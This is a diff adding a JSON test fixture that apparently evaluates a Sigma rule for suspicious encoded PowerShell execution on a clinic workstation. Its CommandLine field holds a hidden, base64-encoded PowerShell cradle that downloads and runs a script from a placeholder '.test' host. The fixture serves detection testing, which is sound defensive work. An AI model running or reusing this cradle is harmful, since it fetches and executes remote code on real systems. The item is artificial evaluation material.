@@ -1,0 +1,19 @@
+{
+  "alert_id": "sigma-eval-0015",
+  "rule": {
+    "id": "2e3f4a5b-6c7d-4e8f-9a0b-1c2d3e4f5a6b",
+    "title": "Suspicious Encoded PowerShell Command Execution",
+    "level": "high",
+    "tags": [
+      "attack.execution",
+      "attack.t1059.001"
+    ]
+  },
+  "event": {
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -w hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALgB1AHAAZABhAHQAZQAtAGMAaABlAGMAawAuAHQAZQBzAHQALwBzAHQAYQBnAGUALgBwAHMAMQAnACkA",
+    "User": "CLINIC\\temp.tech",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "UtcTime": "2026-09-28 11:20:09.402"
+  }
+}
